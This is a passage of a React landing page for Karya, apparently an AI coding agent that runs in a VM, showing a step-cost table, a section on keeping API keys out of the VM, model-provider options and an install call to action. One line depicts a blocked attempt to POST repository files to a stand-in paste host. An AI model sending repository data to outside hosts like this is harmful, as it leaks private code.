                      [1, "812", "188", "$0.0034", "4.2s", "shell", "exit 1 · in the VM", "text-fg-2"],
                      [2, "1,046", "421", "$0.0061", "9.8s", "shell", "exit 0 · in the VM", "text-ok"],
                      [3, "1,297", "96", "$0.0034", "18.3s", "oracle", "pass", "text-ok"],
                      [4, "1,657", "388", "$0.0071", "8.7s", "apply", "accepted · checkpoint", "text-ok"],
                    ] as const
                  ).map(([k, i, o, c, d, tool, out, outColor]) => (
                    <tr key={k} className={`border-t border-line [transition:opacity_.5s] ${rowOp(k)}`}>
                      <td className={tdFirst}>{k}</td>
                      <td className={`${td} text-fg-2`}>{model}</td>
                      <td className={tdR}>{i}</td>
                      <td className={tdR}>{o}</td>
                      <td className={tdR}>{c}</td>
                      <td className={tdR}>{d}</td>
                      <td className={td}>{tool}</td>
                      <td className={`${tdLast} ${outColor}`}>{out}</td>
                    </tr>
                  ))}
                  <tr className="border-t border-fg-3 font-medium tabular-nums">
                    <td className={tdFirst}>total</td>
                    <td className={td}></td>
                    <td className={tdR}>{Math.round(4812 * e).toLocaleString("en-US")}</td>
                    <td className={tdR}>{Math.round(1093 * e).toLocaleString("en-US")}</td>
                    <td className={tdR}>{"$" + (0.02 * e).toFixed(4)}</td>
                    <td className={tdR}>{(41 * e).toFixed(1) + "s"}</td>
                    <td className={td}></td>
                    <td className={tdLast}></td>
                  </tr>
                </tbody>
              </table>
            </div>
          </div>
        </section>

        {/* 04 secrets */}
        <section id="secrets" className="border-t border-line">
          <div className={sectionPad}>
            <div data-reveal className={label}>04 · your keys stay out</div>
            <h2 data-reveal className={`${h2} ${h2m} max-w-[20ch]`}>
              Real keys never <em className={em}>enter the VM.</em>
            </h2>
            <p data-reveal className={`${lead} mt-0 mb-12 max-w-[62ch]`}>The VM holds only placeholders. When a request leaves for the host a key belongs to, the gate adds the real key to the Authorization header, for that host and no other. Every request out is checked and logged: reads that carry nothing from your repo pass, writes to somewhere new ask you, and a placeholder sent anywhere else is refused.</p>
            <div className="grid grid-cols-[repeat(auto-fit,minmax(min(100%,260px),1fr))] gap-4 font-mono text-[13px] leading-[1.7]">
              <div data-reveal className="border border-line-2">
                <div className="border-b border-line px-[14px] py-2 text-fg-3">inside the VM</div>
                <div className="overflow-x-auto px-[14px] py-3 whitespace-pre">
                  <span className="text-fg-3">$</span> echo $STRIPE_KEY{"\n"}
                  <span className="text-fg-3">karya-placeholder-7f3a</span>
                </div>
              </div>
              <div className="flex flex-col justify-center gap-[6px] border border-dashed border-line-2 px-[14px] py-4">
                <div className="text-fg-3">the gate</div>
                <div className="text-[14px] font-medium break-all">adds the real key</div>
                <div className="text-fg-3">only for api.stripe.com</div>
              </div>
              <div data-reveal className="border border-line-2">
                <div className="border-b border-line px-[14px] py-2 text-fg-3">on the way to api.stripe.com</div>
                <div className="overflow-x-auto px-[14px] py-3 whitespace-pre">
                  <span className="text-fg-3">Authorization:</span> Bearer sk_test_••••{"\n"}
                  <span className="text-ok">✓ allowed · logged</span>
                </div>
              </div>
            </div>
            <div className="mt-4 border border-no px-4 py-[14px] font-mono text-[13px] leading-[1.7]">
              <div className="text-no">blocked, and shown to you</div>
              <div className="mt-1">POST paste.example · the body matches 14 files from internal/ · nothing left the VM</div>
            </div>
          </div>
        </section>

        {/* 05 models */}
        <section id="models" className="border-t border-line">
          <div className={`${sectionPad} ${split2}`}>
            <div>
              <div data-reveal className={label}>05 · any model, your keys and your subscriptions</div>
              <h2 data-reveal className={`${h2} ${h2m} max-w-[16ch]`}>
                Bring your <em className={em}>own model.</em>
              </h2>
              <p data-reveal className={`${lead} m-0 max-w-[52ch]`}>Use the API keys and subscriptions you already have. Karya works with any OpenAI-compatible provider, from the big labs to a model running on your own machine. You pay the provider directly, and Karya adds nothing on top.</p>
            </div>
            <div data-reveal className="grid grid-cols-4 gap-px self-center border border-line bg-line">
              {PROVIDERS.map(([id, name]) => (
                <div key={id} title={name} className="group flex aspect-square items-center justify-center bg-bg [transition:background_.2s] hover:bg-bg-2">
                  <span role="img" aria-label={name} className="block h-[clamp(28px,3.4vw,44px)] w-[clamp(28px,3.4vw,44px)] bg-fg-2 [mask-position:center] [mask-repeat:no-repeat] [mask-size:contain] [transition:background_.2s] group-hover:bg-fg" style={{ maskImage: `url(/providers/${id}.svg)`, WebkitMaskImage: `url(/providers/${id}.svg)` }} />
                </div>
              ))}
            </div>
          </div>
        </section>

        {/* closing CTA */}
        <section className="bg-grid border-t border-line">
          <div className="mx-auto my-0 flex max-w-[1200px] flex-col items-start gap-10 px-6 py-[clamp(88px,12vw,168px)] mobile:gap-7 mobile:px-5 mobile:py-16">
            <div data-reveal className="flex items-center gap-[18px]">
              <Mark size={88} />
              <span className="font-mono text-[13px] leading-[1.6] text-fg-3">
                kārya · कार्य
                <br />
                every task, carried through
              </span>
            </div>
            <h2 data-reveal className="m-0 max-w-[11ch] font-serif text-[clamp(56px,10vw,152px)] leading-[0.92] font-normal tracking-[-0.045em] mobile:text-[48px]">
              Let it run. <em className={em}>Stay in control.</em>
            </h2>
            <div data-reveal className={`${cmdBox} gap-4 py-4 pr-4 pl-[22px] text-[clamp(13px,1.6vw,17px)]`}>
              <span className="text-accent">$</span>
              <code className={cmdCode}>{INSTALL}</code>
              <button onClick={this.copy} className={`${copyBtn} px-[14px] py-[6px] text-[13px]`}>
                {copyLabel}
              </button>
            </div>
            <div data-reveal className="flex flex-wrap gap-x-8 gap-y-3 font-mono text-[14px]">
              <Link href="/docs" className={`${textLink} text-fg`}>
                Read the docs →
              </Link>
              <a href="https://github.com/prateek041/karya" className={`${textLink} text-fg`}>
                GitHub ↗
              </a>
              <a href="mailto:lokesh@usekarya.dev?subject=Tell%20me%20when%20Karya%20launches" className={`${textLink} text-fg`}>
                Tell me at launch →
              </a>
            </div>
          </div>
        </section>

        <SiteFooter />
      </div>
    );
  }
}
